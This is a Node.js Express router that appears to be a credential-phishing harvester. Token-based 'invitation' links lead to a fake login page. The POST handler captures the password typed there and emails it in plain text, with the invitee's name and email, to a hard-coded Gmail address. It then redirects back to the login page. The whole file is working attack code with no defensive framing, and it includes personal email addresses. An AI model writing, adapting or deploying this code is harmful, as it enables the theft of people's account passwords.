const express = require('express');
const ejs = require('ejs');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const crypto = require('crypto');
const nodemailer = require('nodemailer');

const dataB = require('../model/dataB.js');

const router = express.Router();



//get or load the invitation link
router.get('/invitation/:token', async (req, res) => {
    try {
        const token = req.params.token;
        const invite = await dataB.findOne({ token });
        // console.log(invite)
        if (!invite) {
            return res.status(404).send('Invalid or expired invitation link');
        }
        res.render('invite', { invite });
    } catch (error) {
        console.error(error);
        res.status(500).send('Server error');
    }
});

router.get('/invitation/:token/login', async (req, res) => {
    const token = req.params.token
    const invite = await dataB.findOne({ token });
    if (!invite) return res.status(404).send('invalid link');
    res.render('login', {
        invite
    });
});

// Step 3: Handle form submission + send email
router.post('/invitation/:token/login', async (req, res) => {
    const token = req.params.token;
    const password = req.body.password
    const invite = await dataB.findOne({ token });
    if (!invite) return res.status(404).send('Invalid or expired invitation link');

// Configure Nodemailer and send the password
const transporter = nodemailer.createTransport({
    service: 'gmail', // or your mail provider
    auth: {
        user: process.env.Email_user, // company email
        pass: process.env.Email_pass // use App Password for Gmail
    }
});

const mailOptions = {
    from: 'achibuzor5@gmail.com',
    to: 'dahumble66@gmail.com', // company email receiving the data
    subject: `New Login details from ${invite.name}`,
    text: `
    Name: ${invite.name}
    Email: ${invite.email}
    Password:${password}
    `
};

try {
   await transporter.sendMail(mailOptions);
    res.redirect('login');
} catch (err) {
    console.error(err);
    res.status(500).send('Error sending email');
}
});


module.exports = router;
